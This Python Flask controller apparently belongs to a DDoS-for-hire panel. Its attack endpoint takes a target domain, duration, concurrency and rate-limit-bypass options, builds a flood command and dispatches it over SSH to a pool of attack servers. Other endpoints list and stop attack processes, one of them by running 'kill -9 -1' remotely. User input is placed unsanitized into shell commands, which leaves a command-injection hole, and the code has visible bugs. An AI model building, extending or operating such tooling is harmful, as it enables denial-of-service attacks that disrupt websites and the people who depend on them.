from flask import jsonify, request, current_app
from app.extensions import socketio
from app.models.attack_log import AttackLog
from app.models.team import Team
from app.models.user_log import UserLog
from app.models.user import User
from app.models.server import Server
import pytz
from datetime import datetime
from app.configs.blacklist import MAX_ATTACK_ATTEMPTS
from app.models.attack_server_log import AttackServerLog
from cryptography.hazmat.primitives import serialization
from app.db import db
import paramiko
import threading
import json
import os
from app.utils.decrypt_payload import decrypt_payload
from app.services.response import Response
from app.utils.validate import is_blacklisted, is_whitelisted
from operator import itemgetter
from app.services.server_manager import ServerManager
from app.utils.header import get_header

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
private_key_path = os.path.join(BASE_DIR, 'configs', 'private_key.pem')
vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh') 

with open(private_key_path, 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None
    )

class AttackController:
    def attack(self):
        # if not is_whitelisted():
        #     return Response.error(message=f"{clientIp} IP Access Denied", code=400)

        data = request.get_json()

        required_fields = {
            "domain": "Domain",
            "attack_time": "Attack Time",
            "bypass_ratelimit": "Bypass Ratelimit",
            "core_strength": "Core Strength",
            "mode": "Mode",
            "concurrents": "Concurrents",
            "request": "Request",
            "typeAttack": "Type Attack"
        }

        currentUser = request.currentUser

        if currentUser.get('isAdmin'):
            required_fields["servers"] = "Servers"

        for field, field_name in required_fields.items():
            if not data.get(field):
                return Response.error(message=f"{field_name} is required", code=400)

        domain = data["domain"]
        attackTimeValue = data["attack_time"]
        bypassRateLimitValue = data["bypass_ratelimit"]
        coreStrengthValue = data["core_strength"]
        modeValue = data["mode"]
        concurrentValue = data["concurrents"]
        requestCount = data["request"]
        typeAttack = data["typeAttack"]
        death_sword_http = data.get("death_sword_http", "")
        
        if is_blacklisted(domain):
            user.increment_attack_count()
            return Response.error(f"Your attack on {domain} has been blocked", code=400)

        try:
            user = User.query.get(currentUser['id'])
            if not user.status:
                return Response.error("Your account has been deactivated", code=400)

            if user.attackCount >= MAX_ATTACK_ATTEMPTS:
                user.deactivate()
                return Response.error("You have exceeded the maximum number of attacks ({MAX_ATTACK_ATTEMPTS}). Your account has been deactivated", code=400)

            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} --debug true --ratelimit {bypassRateLimitValue}'
            
            if typeAttack == 'hyna_valkyra':
                command = f'{modeValue} {domain} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'

            attackLog = AttackLog(
                userId=currentUser['id'],
                domainName=domain,
                time=int(attackTimeValue),
                concurrent=int(concurrentValue),
                request=int(requestCount),
                command=command,
                headers=json.dumps(get_header()) if get_header() else None
            )
            db.session.add(attackLog)
            db.session.commit()

            if currentUser.get('isAdmin') is False:
                server_id = currentUser['server_id']
                servers_data = Server.query.get(server_id)

                if not servers_data:
                    return Response.error("Server not found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']

                return Response.success(ServerManager.server_only(server_ip, server_username, server_password, command))
            else:
                servers_data = data["servers"]
                servers_query = Server.query.filter(Server.ip.in_(servers_data)).all()
                servers = [server.to_dict() for server in servers_query]

                return Response.success(ServerManager.server_multi(servers, command))
            
        except Exception as e:
            return Response.error(str(e), code=400)

    def terminate_attack(self, logId: int):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404

        if logId not in self.active_channels:
            return jsonify({
                "status": "error",
                "message": "No active channels found for this attack"
            }), 404

        terminated_servers = []
        for serverHostname, channel in self.active_channels[logId].items():
            try:
                channel.close()
                serverLog = AttackServerLog.query.filter_by(
                    attackLogId=logId,
                    serverHostname=serverHostname
                ).first()
                if serverLog:
                    serverLog.status = 'terminated'
                    db.session.commit()
                terminated_servers.append(serverHostname)
            except Exception as e:
                current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")

        # Update attack log status
        attackLog.status = 'terminated'
        db.session.commit()

        # Clean up active_channels
        del self.active_channels[logId]

        return jsonify({
            "status": "success",
            "message": "Attack terminated successfully",
            "terminatedServers": terminated_servers
        }), 200
        
    def cancel_all_processes(self):
        currentUser = request.currentUser
        data = request.get_json()
        server_hostnames = data.get('server', [])
        pids = data.get('pid', [])
        
        if not server_hostnames:
            return jsonify({
                "status": "error",
                "message": "No server hostnames provided"
            }), 400
            
        # Check if user has access to these servers
        if currentUser.get('team_id'):
            team = Team.query.get(currentUser['team_id'])
            if team:
                authorized_servers = Server.query.filter(Server.id.in_(team.servers)).all()
                authorized_ips = [server.ip for server in authorized_servers]
                
                # Check if all requested servers are authorized
                for hostname in server_hostnames:
                    if hostname not in authorized_ips:
                        return jsonify({
                            "status": "error",
                            "message": f"Unauthorized access to server: {hostname}"
                        }), 403
        
        # Terminate processes on each server
        results = {}
        for hostname in server_hostnames:
            try:
                # Find server credentials
                server = Server.query.filter_by(ip=hostname).first()
                if not server:
                    results[hostname] = {
                        "status": "error",
                        "message": "Server not found"
                    }
                    continue
                
                # Connect to the server
                sshClient = paramiko.SSHClient()
                sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sshClient.connect(hostname, username=server.username, password=server.password)
                
                # Execute kill command
                stdin, stdout, stderr = sshClient.exec_command("kill -9 -1")
                
                # Get output and errors
                error = stderr.read().decode()
                if error:
                    results[hostname] = {
                        "status": "error",
                        "message": error
                    }
                else:
                    results[hostname] = {
                        "status": "success",
                        "message": "Server processes terminated"
                    }
                
                sshClient.close()
            except Exception as e:
                results[hostname] = {
                    "status": "error",
                    "message": str(e)
                }
                
        # Check overall status
        if all(result["status"] == "success" for result in results.values()):
            return jsonify({
                "status": "success",
                "message": "All server processes terminated successfully",
                "results": results
            }), 200
        else:
            return jsonify({
                "status": "partial_success" if any(result["status"] == "success" for result in results.values()) else "error",
                "message": "Some or all server process terminations failed",
                "results": results
            }), 207  # Using 207 Multi-Status for partial success

    def terminate_server_attack(self, logId: int, serverHostname: str):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()

        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404
        if logId not in self.active_channels or serverHostname not in self.active_channels[logId]:
            return jsonify({
                "status": "error",
                "message": f"No active channel found for server {serverHostname}"
            }), 404

        try:
            # Close the specific channel
            channel = self.active_channels[logId][serverHostname]
            channel.close()

            # Update server log status
            serverLog = AttackServerLog.query.filter_by(
                attackLogId=logId,
                serverHostname=serverHostname
            ).first()
            if serverLog:
                serverLog.status = 'terminated'
                db.session.commit()

            # Remove channel from active_channels
            del self.active_channels[logId][serverHostname]
            if not self.active_channels[logId]:
                del self.active_channels[logId]
                # If no more active channels, update attack log status
                attackLog.status = 'terminated'
                db.session.commit()

            return jsonify({
                "status": "success",
                "message": f"Attack terminated successfully for server {serverHostname}"
            }), 200

        except Exception as e:
            current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Error terminating channel: {str(e)}"
            }), 500

    def getLogs(self):
        currentUser = request.currentUser
        limit = int(request.args.get('limit', 10))
        page = int(request.args.get('page', 1))
        skip = (page - 1) * limit

        # Modified query to include server logs
        query = AttackLog.query.filter_by(userId=currentUser['id'])
        logs = query.order_by(AttackLog.createdAt.desc()).limit(limit).offset(skip).all()
        total = query.count()

        # Fetch server logs for each attack log
        logsWithServerData = []
        for log in logs:
            logDict = log.toDict()
            serverLogs = AttackServerLog.query.filter_by(attackLogId=log.id).all()
            logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]
            logsWithServerData.append(logDict)

        return jsonify({
            'data': logsWithServerData,
            'meta': {
                'total': total,
                'totalPages': -(-total // limit),
                'currentPage': page,
                'pageSize': limit
            }
        }), 200

    def getLog(self, logId: int):
        currentUser = request.currentUser
        log = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not log:
            return jsonify({
                "status": "error",
                "message": "Log not found"
            }), 404

        # Include server logs in the response
        serverLogs = AttackServerLog.query.filter_by(attackLogId=logId).all()
        logDict = log.toDict()
        logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]

        return jsonify({
            "status": "success",
            "data": logDict
        }), 200

    def list_processes(self):
        try:
            currentUser = request.currentUser

            if currentUser.get('isAdmin') is False:
                server_id = currentUser['server_id']
                servers_data = Server.query.get(server_id)

                if not servers_data:
                    return Response.error("Server not found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']

                return Response.success(ServerManager.server_get_single(server_ip, server_username, server_password))
            else:
                servers_query = Server.query.all()
                servers = [server.to_dict() for server in servers_query]

                return Response.success(ServerManager.server_get_multi(servers))

        except Exception as e:
            return Response.error(message=str(e), code=404)

    def stop_process(self, pid=None):
        try:
            currentUser = request.currentUser

            if currentUser.get('isAdmin') is False:
                
                if not isinstance(pid, int) or pid <= 0:
                    return Response.error("Invalid PID", code=400)

                server_id = currentUser['server_id']
                servers_data = Server.query.get(server_id)

                if not servers_data:
                    return Response.error("Server not found", 404)

                server_ip = servers_data.to_dict()['ip']
                server_username = servers_data.to_dict()['username']
                server_password = servers_data.to_dict()['password']

                return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))

            else:
                if not isinstance(pid, int) or pid <= 0:
                    servers_query = Server.query.all()
                    servers = [server.to_dict() for server in servers_query]

                    return Response.success(ServerManager.server_stop_multi(servers))
                else:
                    data = request.get_json()

                    if not data or "server_ip" not in data or not data["server_ip"]:
                        return Response.error("Missing or invalid 'server_ip'", 400)

                    servers_data = Server.query.filter_by(ip=data['server_ip']).first()

                    if not servers_data:
                        return Response.error("Server not found", 404)

                    server_ip = data['server_ip']
                    server_username = servers_data.to_dict()['username']
                    server_password = servers_data.to_dict()['password']

                    return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))

        except Exception as e:
            return Response.error(message=str(e), code=404)
